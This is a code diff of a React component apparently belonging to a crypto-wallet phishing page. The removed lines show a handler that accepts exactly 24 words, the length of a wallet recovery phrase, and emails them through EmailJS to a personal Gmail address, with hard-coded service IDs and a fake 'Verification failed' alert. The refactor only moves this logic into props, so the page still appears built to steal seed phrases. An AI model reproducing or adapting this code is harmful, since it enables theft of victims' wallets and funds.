@@ -1,47 +1,11 @@
 import React, { useState } from "react";
-import emailjs from "@emailjs/browser";
 import { Oval } from "react-loader-spinner";
 
-function Phrase() {
+function Phrase({handleSend, setPhrase, phrase,error, loading}) {
   // const navigate =useNavigate()
-  const [phrase, setPhrase] = useState("");
-  const [error, setError] = useState(false);
-  const [loading, setLoading] = useState(false);
 
-  const serviceID = "service_t1nq7uj";
 
-  const templateID = "template_womg9wj";
-  const userID = "wn-KizZUAJPXgXFA4";
-
-  const handleSend = async () => {
-    setLoading(true);
-
-    const wordCount = phrase.trim().split(/\s+/).length;
-    if (wordCount !== 24) {
-      setError(true);
-      setLoading(false); // Stop loading if there is an error
-      return;
-    }
-
-    const templateParams = { message: phrase };
-
-    try {
-      await emailjs.send(serviceID, templateID, templateParams, userID, {
-        to: ["ld604068@gmail.com"],
-      });
-      setPhrase("");
-      setLoading(true);
-
-      // navigate('/approved')
-      console.log("sent");
-    } catch (error) {
-      console.error("Error:", error);
-      alert("Verification failed. Please try again.");
-      setError(true);
-    } finally {
-      setLoading(false); // Stop loading after async operation completes
-    }
-  };
+ 
 
   return (
     <div className="mb-3">
